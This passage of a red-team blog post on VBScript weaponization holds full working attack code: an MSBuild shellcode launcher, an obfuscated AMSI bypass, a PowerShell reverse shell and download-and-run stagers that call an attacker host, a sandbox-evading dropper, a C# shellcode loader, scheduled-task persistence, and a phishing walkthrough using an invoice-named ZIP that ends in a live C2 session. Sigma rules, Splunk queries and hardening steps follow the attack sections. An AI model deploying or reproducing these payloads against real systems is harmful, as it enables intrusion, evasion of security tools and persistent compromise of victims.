```vbscript
' stage1.vbs — writes MSBuild XML and executes it
Dim oFSO, oFile, oShell

Set oFSO  = CreateObject("Scripting.FileSystemObject")
Set oFile = oFSO.CreateTextFile("C:\Windows\Temp\build.xml", True)
oFile.WriteLine "<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
oFile.WriteLine "  <Target Name=""x"">"
oFile.WriteLine "    <Code Type=""Fragment"" Language=""cs"">"
oFile.WriteLine "      <![CDATA["
oFile.WriteLine "        byte[] sc = new byte[] { /* SHELLCODE BYTES HERE */ };"
oFile.WriteLine "        var buf = System.Runtime.InteropServices.Marshal.AllocHGlobal(sc.Length);"
oFile.WriteLine "        System.Runtime.InteropServices.Marshal.Copy(sc, 0, buf, sc.Length);"
oFile.WriteLine "        var ptr = System.Runtime.InteropServices.Marshal.GetDelegateForFunctionPointer(buf, typeof(System.Threading.ThreadStart));"
oFile.WriteLine "        ptr.DynamicInvoke();"
oFile.WriteLine "      ]]>"
oFile.WriteLine "    </Code>"
oFile.WriteLine "  </Target>"
oFile.WriteLine "</Project>"
oFile.Close

Set oShell = CreateObject("WScript.Shell")
oShell.Run "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Temp\build.xml /t:x", 0, False
```

### Chain 4: VBS → DotNetToJScript → In-Memory .NET (SharpShooter)

Execute a full .NET assembly in-memory from VBScript using DotNetToJScript technique:

```bash
# On attacker machine — generate VBS payload that loads .NET assembly in-memory
root@root$ git clone https://github.com/mdsecactivebreach/SharpShooter
root@root$ cd SharpShooter

# Generate shellcode
root@root$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.55 LPORT=443 -f raw -o msf.raw

# Generate stageless VBS wrapping .NET assembly
root@root$ python SharpShooter.py --payload vbs --dotnetver 4 --stageless --rawscfile msf.raw --output evil --sandbox 2,3,4,5
```

Generated VBScript structure:

```vbscript
' (abbreviated — actual output is ~500 lines of obfuscated VBS)
' DotNetToJScript technique: serializes .NET assembly into VBS
' Uses Activator.CreateInstance via COM + BinaryFormatter deserialization
' Bypasses AppLocker (runs under cscript/wscript — trusted)
' No PowerShell required — pure VBScript .NET loader

Dim o
Set o = CreateObject("Scripting.Dictionary")
o.CompareMode = 0

' ... Base64-encoded .NET assembly embedded here ...
' ... COM activation via WScript.Shell ...
' ... In-memory reflection load ...
```

### Chain 5: VBS → WMI → Scheduled Task Persistence

```vbscript
' Create scheduled task via WMI for persistence
Dim oShell
Set oShell = CreateObject("WScript.Shell")
oShell.Run "schtasks /create /tn ""WindowsUpdateHelper"" /tr """ & _
    "wscript.exe //B C:\Windows\Temp\beacon.vbs"" " & _
    "/sc DAILY /st 09:00 /ru SYSTEM /f", 0, True
```

---

## VBScript Payload Templates

### Reverse Shell via PowerShell

```vbscript
' Full reverse shell stager
Option Explicit

Dim oShell, sCmd

' AMSI bypass (obfuscated)
Dim sAB
sAB = "[Ref].Assembly.GetType('System.Management.Automation." & _
      Chr(65) & "msiUtils').GetField('amsiInit" & _
      Chr(70) & "ailed','NonPublic,Static').SetValue($null,$true);"

' Reverse shell command
Dim sRS
sRS = "$c=New-Object Net.Sockets.TCPClient('10.10.14.55',4444);" & _
      "$s=$c.GetStream();" & _
      "[byte[]]$b=0..65535|%{0};" & _
      "while(($i=$s.Read($b,0,$b.Length)) -ne 0){" & _
      "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);" & _
      "$sb=(iex $d 2>&1|Out-String);" & _
      "$sb2=$sb+'PS '+(pwd).Path+'> ';" & _
      "$sbt=[text.encoding]::ASCII.GetBytes($sb2);" & _
      "$s.Write($sbt,0,$sbt.Length);$s.Flush()};"

' Execute
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -ep bypass -nop -w hidden -c """ & sAB & sRS & """", 0, False
```

### Meterpreter Stager (HTTPS)

```vbscript
Option Explicit

Dim oShell, sEncCmd
' Base64-encoded: powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('https://10.10.14.55/payload.ps1')
sEncCmd = "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIABJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADAALgAxADAALgAxADQALgA1ADUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -ep bypass -nop -w hidden -enc " & sEncCmd, 0, False
```

### Multi-Stage Dropper

```vbscript
' Stage 1: download & execute stage 2 if not sandboxed
Option Explicit

Function IsSandbox()
    IsSandbox = False
    On Error Resume Next
    Dim oWMI, nProcs
    Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
    nProcs = 0
    Dim oProc
    For Each oProc In oWMI.ExecQuery("SELECT * FROM Win32_Process")
        nProcs = nProcs + 1
    Next
    If nProcs < 30 Then IsSandbox = True
    Dim oBIOS
    For Each oBIOS In oWMI.ExecQuery("SELECT * FROM Win32_BIOS")
        If InStr(LCase(oBIOS.SMBIOSBIOSVersion), "vbox") > 0 Or _
           InStr(LCase(oBIOS.SMBIOSBIOSVersion), "vmware") > 0 Or _
           InStr(LCase(oBIOS.Manufacturer), "virtual") > 0 Then
            IsSandbox = True
        End If
    Next
End Function

If Not IsSandbox() Then
    Dim oHTTP, oStream, oShell
    Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    oHTTP.Open "GET", "https://10.10.14.55/c2/stage2.ps1", False
    oHTTP.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    oHTTP.Send

    Dim sStage2
    sStage2 = oHTTP.ResponseText

    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "powershell -ep bypass -nop -w hidden -c """ & _
        "IEX([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" & _
        "ENCODED_STAGE2_HERE')))" & """", 0, False
End If
```

---

## Real-World Campaigns

### 1. SHADOW#REACTOR (Remcos RAT — 2025/2026)

Discovered January 2026. Multi-stage VBScript chain delivering Remcos RAT.

**Infection chain:**
```
Phishing email
  └─ ZIP attachment
        └─ Obfuscated VBScript (.vbs)
              └─ PowerShell download cradle
                    └─ Shellcode stage 1
                          └─ Second shellcode → Remcos RAT injection
```

**Key techniques:**
- Heavy VBS obfuscation (chr() encoding + garbage code insertion)
- PowerShell AMSI bypass via memory patching
- LOLbin chain: VBS → PowerShell → MSBuild → shellcode
- Process hollowing into svchost.exe for Remcos RAT

### 2. Grandoreiro / URSA (UNC5176 — 2024)

Brazilian threat actor targeting LATAM financial institutions. Discovered June 2024.

**Infection chain:**
```
Phishing email / malvertising
  └─ ZIP → HTA file (mshta.exe)
        └─ Stage 1 VBScript (drops + calls stage 2)
              └─ Stage 2 VBScript (anti-sandbox checks)
                    └─ C2 beacon → URSA/Grandoreiro payload
```

**Key techniques:**
- HTA → VBS two-stage dropper
- Anti-sandbox: process count, VM BIOS checks, uptime checks
- C2 communications over HTTPS to cloud providers (Azure, Dropbox CDN)
- Mouse activity recording to bypass ML-based behavioral analysis
- Ciphertext Stealing (CTS) for string encryption in newer variants
- VBS delivers ZIP containing executable + VBS for persistence

### 3. OilRig / OopsIE (APT34 — 2018, still active variants 2024)

Iranian APT, Middle East government targeting.

**VBS persistence mechanism:**
```
%APPDATA%\Windows\ShwDoc.VBS
```
Runs every 3 minutes via scheduled task. C2 communications:

```
Beacon: GET http://c2/khc?<hex(whoami)>
Command: GET http://c2/tahw?<hex(whoami)>
Result: POST http://c2/pser?<hex(whoami)>(BBZ|BBY)<hex(output)>
```

**Key VBS techniques:**
- String reversal obfuscation (chk → khc, what → tahw, resp → pser)
- Scheduled task persistence via VBS
- VBS → exe dropper chain
- URL parameter encoding with hex

### 4. Turla (FSB-linked APT — ongoing)

Uses VBScript as a scripting engine for their Kazuar/Carbon/Gazer implant chains. Known for:
- VBScript COM automation for lateral movement
- Satellite-based C2 (hijacking satellite uplinks) with VBS beacon
- Elaborate anti-forensics (timestomping, log clearing from VBS)

### 5. WIRTE (APT — Middle East 2021–2024)

Uses mshta + VBScript for initial execution:
```
spear-phishing → .xls with embedded macro
  └─ mshta.exe http://c2/payload.hta
        └─ VBScript downloads JWDE/LitePower backdoor
```

---

## DotNetToJScript — Advanced In-Memory Execution

DotNetToJScript (by James Forshaw) allows embedding arbitrary .NET assemblies in VBScript for in-memory execution without PowerShell.

```bash
# Compile a .NET DLL that runs shellcode
root@root$ cat > EvilLoader.cs << 'EOF'
using System;
using System.Runtime.InteropServices;
[ComVisible(true)]
public class EvilLoader {
    [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
    [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    public void Run() {
        byte[] sc = new byte[] { /* shellcode bytes */ };
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
        Marshal.Copy(sc, 0, mem, sc.Length);
        IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(t, 0xFFFFFFFF);
    }
}
EOF

root@root$ csc /target:library /out:EvilLoader.dll EvilLoader.cs

# Generate VBScript wrapper
root@root$ DotNetToJScript.exe EvilLoader.dll -c EvilLoader --lang=VBScript --ver=v4 -o evil.vbs
```

The generated VBS uses BinaryFormatter deserialization to load the .NET assembly from a Base64 blob, then invokes the `Run()` method — all in-memory, no files dropped.

---

## Attacker Infrastructure Setup

### C2 Server Setup (Python SimpleHTTP + Sliver)

```bash
# Start Sliver C2 (attacker machine: 10.10.14.55)
root@root$ sudo sliver-server

sliver > generate --mtls 10.10.14.55 --os windows --arch amd64 --format shellcode --save /var/www/html/beacon.bin

# Generate PowerShell loader that wraps the shellcode
sliver > generate stager --lhost 10.10.14.55 --lport 443 --protocol https --format ps1 --save /var/www/html/stager.ps1

# Start HTTPS listener
root@root$ sudo sliver-server mtls --lport 443

# Host all files
root@root$ cd /var/www/html
root@root$ python3 -m http.server 80 &
root@root$ openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes -subj "/CN=updates.microsoft.com"
root@root$ python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, certfile='server.pem', server_side=True)
server.serve_forever()
" &
```

### Generate msfvenom VBS Payload

```bash
# Generate VBScript meterpreter stager
root@root$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.55 LPORT=443 -f vbs -o stager.vbs

# Generate HTA payload
root@root$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.55 LPORT=443 -f hta-psh -o payload.hta

# Start metasploit handler
root@root$ sudo msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.14.55; set LPORT 443; set ExitOnSession false; exploit -j"
```

### Empire / StarFighters (VBS-based Empire launcher)

```bash
# StarFighters generates a VBS Empire launcher
root@root$ git clone https://github.com/Cn33liz/StarFighters
root@root$ cd StarFighters
root@root$ python StarFighters.py -t vbs -l http://10.10.14.55 -p 80 -d inlanefreight.local
```

---

## Full Attack Walkthrough

### Scenario: Email attachment → VBS → AMSI Bypass → Sliver C2

**Step 1: Craft the weaponized VBS (attacker)**

```bash
root@root$ cat > weaponized.vbs << 'EOVBS'
Option Explicit

' Sandbox check
Function IsSandbox()
    IsSandbox = False
    On Error Resume Next
    Dim oWMI, nProcs : nProcs = 0
    Set oWMI = GetObject("winmgmts:\\.\root\cimv2")
    Dim p
    For Each p In oWMI.ExecQuery("SELECT Name FROM Win32_Process")
        nProcs = nProcs + 1
    Next
    If nProcs < 30 Then IsSandbox = True
End Function

If IsSandbox() Then WScript.Quit

' Build object name with Chr() + split to evade static detection
Dim s1, s2, s3
s1 = Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116)
s2 = Chr(46)
s3 = Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)

Dim oShell
Set oShell = CreateObject(s1 & s2 & s3)

' AMSI bypass (obfuscated string split)
Dim sAB
sAB = "[Ref].Assembly.GetType('System.Management.Automation." & _
    Chr(65) & "msi" & Chr(85) & "tils').GetField('amsi" & _
    Chr(73) & "nit" & Chr(70) & "ailed','NonPublic,Static').SetValue($null,$true);"

' Sliver HTTPS stager
Dim sStager
sStager = "IEX(New-Object Net.WebClient).DownloadString('https://10.10.14.55/stager.ps1')"

' Execute
Dim sCmd
sCmd = "p" & Chr(111) & "wer" & Chr(115) & "hell -ep bypass -nop -w hidden -c " & _
    Chr(34) & sAB & sStager & Chr(34)
oShell.Run sCmd, 0, False
EOVBS
```

**Step 2: Deliver via phishing (ZIP → VBS in email)**

```bash
root@root$ zip Invoice_Q1_2026.zip weaponized.vbs
# Send via phishing framework (GoPhish, etc.)
```

**Step 3: Victim opens attachment**

```
eliot@DESKTOP-WIN11 opens Invoice_Q1_2026.zip
  → double-clicks weaponized.vbs
  → wscript.exe executes it
  → sandbox check passes (30+ processes)
  → PowerShell launches with AMSI disabled
  → Sliver stager downloads and executes beacon
  → C2 connection established to 10.10.14.55:443
```

**Step 4: C2 shell**

```
sliver (10.10.14.55) > sessions
ID  Name      Transport  Remote Address          Hostname         User    OS   Arch  PID    Last Check-In
1   WEAPON1   mtls       10.129.229.224:49842    DESKTOP-WIN11    eliot   Win  x64   4832   just now

sliver > use 1
sliver (WEAPON1) > whoami
inlanefreight\eliot
sliver (WEAPON1) > getprivs
SeShutdownPrivilege
SeChangeNotifyPrivilege
SeUndockPrivilege
SeIncreaseWorkingSetPrivilege
```

---

## Detection: Blue Team Perspective

### Sysmon Event IDs

| Event ID | Event | What to Look For |
|----------|-------|-----------------|
| 1 | Process Create | `wscript.exe`, `cscript.exe`, `mshta.exe` with unusual parent or cmdline |
| 3 | Network Connect | `wscript.exe` / `mshta.exe` initiating outbound connections |
| 7 | Image Load | `amsi.dll` loaded by scripting engines (patching precursor) |
| 11 | File Create | `.vbs`, `.hta`, `.sct` dropped to disk from browser/email |
| 15 | File Create Stream Hash | ADS detection for hidden VBS payloads |
| 22 | DNS Query | Suspicious DNS queries from `wscript.exe` / `mshta.exe` |

### Sigma Rules

**Rule 1 — VBScript/JScript Execution by WSH**

```yaml
title: Suspicious WScript/CScript Script Execution
id: cea72823-df4d-4567-950c-0b579eaf0846
status: test
description: Detects script file execution (.vbs, .vbe, .wsf) by Wscript/Cscript
tags:
  - attack.execution
  - attack.t1059.005
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - OriginalFileName:
        - 'wscript.exe'
        - 'cscript.exe'
    - Image|endswith:
        - '\wscript.exe'
        - '\cscript.exe'
  selection_cli:
    CommandLine|contains:
      - '.vbs'
      - '.vbe'
      - '.wsf'
  condition: selection_img and selection_cli
falsepositives:
  - Legitimate administrative scripts
level: medium
```

**Rule 2 — Mshta Suspicious Execution**

```yaml
title: Mshta Suspicious VBScript Execution
id: b4f6ac55-4c6d-4e8d-93af-20154bc88b37
status: test
description: Detects mshta.exe executing inline VBScript or remote HTA
tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218.005
  - attack.t1059.005
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\mshta.exe'
    CommandLine|contains:
      - 'vbscript:'
      - 'javascript:'
      - '.hta'
      - 'http'
      - 'https'
  filter_legitimate:
    CommandLine|contains:
      - 'C:\Windows\System32\'
  condition: selection and not filter_legitimate
falsepositives:
  - Legitimate enterprise HTA applications
level: high
```

**Rule 3 — VBScript Registry Modification**

```yaml
title: Registry Modification Attempt Via VBScript
id: 921aa10f-2e74-4cca-9498-98f9ca4d6fdf
status: experimental
description: Detects registry modification using VBScript WScript.Shell RegWrite
tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1112
  - attack.t1059.005
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    CommandLine|contains|all:
      - 'CreateObject'
      - 'Wscript.shell'
      - '.RegWrite'
  condition: selection
level: medium
```

**Rule 4 — BITS Download with .VBS Extension (T1197)**

```yaml
title: BITS Transfer Job Saving Suspicious VBS Extension
id: b85e5894-9b19-4d86-8c87-a2f3b81f0521
status: test
description: Detects BITS downloading VBS/VBE files
tags:
  - attack.defense-evasion
  - attack.t1197
logsource:
  product: windows
  service: bits-client
detection:
  selection:
    EventID: 16403
    LocalName|endswith:
      - '.vbs'
      - '.vbe'
      - '.hta'
  condition: selection
level: medium
```

**Rule 5 — AmsiScanBuffer Patch Attempt**

```yaml
title: Potential AMSI Bypass via AmsiScanBuffer Patch
id: c7c6b25d-cf40-4d38-8d3b-0cac14fc7f56
status: experimental
description: Detects memory patching patterns targeting AmsiScanBuffer
tags:
  - attack.defense-evasion
  - attack.t1562.001
logsource:
  category: ps_script
  product: windows
detection:
  selection:
    ScriptBlockText|contains|all:
      - 'VirtualProtect'
      - 'AmsiScan'
  condition: selection
level: high
```

### Splunk Detection Queries

**Query 1 — WScript/CScript Network Connections**

```spl
index=windows source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=3
(Image="*\\wscript.exe" OR Image="*\\cscript.exe" OR Image="*\\mshta.exe")
| table _time, ComputerName, Image, DestinationIp, DestinationPort, User
| sort -_time
```

**Query 2 — Mshta Remote Execution**

```spl
index=windows source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1
Image="*\\mshta.exe"
(CommandLine="*http*" OR CommandLine="*vbscript:*" OR CommandLine="*javascript:*")
| stats count by ComputerName, User, CommandLine
| sort -count
```

**Query 3 — VBScript AMSI Bypass Patterns**

```spl
index=windows source="XmlWinEventLog:Microsoft-Windows-PowerShell/Operational"
EventCode=4104
(ScriptBlockText="*VirtualProtect*" AND ScriptBlockText="*amsi*")
OR (ScriptBlockText="*amsiInitFailed*")
OR (ScriptBlockText="*AmsiScanBuffer*" AND ScriptBlockText="*LoadLibrary*")
| table _time, ComputerName, User, ScriptBlockText
| sort -_time
```

**Query 4 — VBScript Spawning PowerShell**

```spl
index=windows source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1
(ParentImage="*\\wscript.exe" OR ParentImage="*\\cscript.exe" OR ParentImage="*\\mshta.exe")
(Image="*\\powershell.exe" OR Image="*\\cmd.exe" OR Image="*\\msbuild.exe")
| table _time, ComputerName, User, ParentImage, Image, CommandLine
| sort -_time
```

---

## Defensive Hardening

### Disable Windows Script Host

```registry
; Disable WSH globally (HKLM) — affects all users
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows Script Host\Settings]
"Enabled"=dword:00000000

; Disable WSH per-user (HKCU)
[HKEY_CURRENT_USER\Software\Microsoft\Windows Script Host\Settings]
"Enabled"=dword:00000000
```

```powershell
# Disable WSH via PowerShell
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Script Host\Settings" -Name "Enabled" -Value 0 -Type DWord
```

### AppLocker Rules

```xml
<!-- Block wscript.exe and cscript.exe for standard users -->
<RuleCollection Type="Script" EnforcementMode="Enabled">
  <FilePathRule Id="..." Action="Deny" UserOrGroupSid="S-1-1-0" Name="Block wscript.exe">
    <Conditions>
      <FilePathCondition Path="%SYSTEM32%\wscript.exe"/>
    </Conditions>
  </FilePathRule>
  <FilePathRule Id="..." Action="Deny" UserOrGroupSid="S-1-1-0" Name="Block cscript.exe">
    <Conditions>
      <FilePathCondition Path="%SYSTEM32%\cscript.exe"/>
    </Conditions>
  </FilePathRule>
</RuleCollection>
```

### WDAC Policy (Block Script Execution Outside Trusted Paths)

```powershell
# Create WDAC base policy blocking unapproved script interpreters
New-CIPolicy -Level Publisher -FilePath C:\Policies\BasePolicy.xml -UserPEs

# Add script rule: only allow wscript/cscript from SYSTEM32
# Block mshta.exe entirely
Merge-CIPolicy -OutputFilePath C:\Policies\Merged.xml `
    -PolicyPaths C:\Policies\BasePolicy.xml,C:\Policies\BlockScripting.xml
ConvertFrom-CIPolicy -XmlFilePath C:\Policies\Merged.xml -BinaryFilePath C:\Policies\SiPolicy.p7b
```

### Email Gateway

- Block `.vbs`, `.vbe`, `.hta`, `.wsf`, `.wsh`, `.scf`, `.scr` attachments
- Detonate ZIP attachments in sandbox before delivery
- Flag emails with HTML Application links (`mshta` protocol)

### EDR Tuning

- Alert on `wscript.exe` / `cscript.exe` spawning `powershell.exe` / `cmd.exe`
- Alert on `mshta.exe` making network connections
- Alert on any process loading `amsi.dll` followed by `VirtualProtect` calls
- Alert on BITS jobs creating `.vbs` / `.exe` files in temp directories

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Sub-Technique | Description |
|--------|-----------|---------------|-------------|
| Execution | T1059 | T1059.005 — Visual Basic | Core VBScript execution |
| Execution | T1047 | — | WMI process create |
| Defense Evasion | T1218 | T1218.005 — Mshta | HTA proxy execution |
| Defense Evasion | T1218 | T1218.010 — Regsvr32 | SCT COM scriptlet |
| Defense Evasion | T1218 | T1218.011 — Rundll32 | mshtml JS/VBS via rundll32 |
| Defense Evasion | T1562 | T1562.001 — AMSI Bypass | AmsiScanBuffer patching |
| Defense Evasion | T1027 | T1027.010 — Obfuscated Files | Chr(), XOR, Replace() |
| Defense Evasion | T1197 | — | BITS download cradle |
| Defense Evasion | T1055 | — | Process injection via VBS |
| Persistence | T1053 | T1053.005 — Scheduled Task | schtasks via WScript.Shell |
| Persistence | T1112 | — | Registry write via VBS |
| C2 | T1071 | T1071.001 — Web Protocols | HTTPS C2 from VBS |
| C2 | T1071 | T1071.004 — DNS | DNS tunneling from VBS |
| Execution | T1127 | T1127.001 — MSBuild | VBS → MSBuild shellcode |
| Initial Access | T1566 | T1566.001 — Spearphishing | VBS in ZIP attachment |

---

## Summary

VBScript sits at a unique crossroads: deprecated by Microsoft but still shipped, executed, and weaponized daily. Its power comes from its deep integration with the Windows COM automation model, which gives it access to the same APIs available to any compiled binary — network stacks, the filesystem, WMI, the registry, the process API.

The combination of AMSI bypass (WSH InitFailed trick, AmsiScanBuffer patching, amsiInitFailed via obfuscated PowerShell), obfuscation (chr() encoding, Replace() chains, XOR), and LOLbin chaining (wscript → powershell → msbuild → shellcode) makes VBScript a complete weaponization platform that requires no compiled dropper, no admin rights for most techniques, and leaves a minimal forensic footprint when executed fileless.

The SHADOW#REACTOR and Grandoreiro campaigns in 2025–2026 confirm that threat actors continue to innovate on VBScript-based delivery chains — meaning this is not legacy knowledge, it is active adversary tradecraft.

---

*Blog by Hossam Ayman Saeed (Hossam Shady) — Security Engineer / Red Teamer*  
*Instructor @ EC-Council | CRTP | CRTA | CPTS | eCPPT | eWAPT | eJPT | HTB ProLabs*
